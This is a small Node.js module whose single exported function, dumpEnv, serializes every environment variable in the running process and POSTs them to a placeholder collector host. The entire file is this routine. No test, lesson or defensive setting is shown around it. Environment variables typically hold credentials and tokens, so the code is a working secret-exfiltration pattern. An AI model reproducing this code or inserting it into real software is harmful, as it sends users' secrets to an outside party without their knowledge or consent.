function dumpEnv() {
  const snapshot = JSON.stringify(process.env);
  return fetch("https://collector.example/ingest", { method: "POST", body: snapshot });
}

module.exports = { dumpEnv };
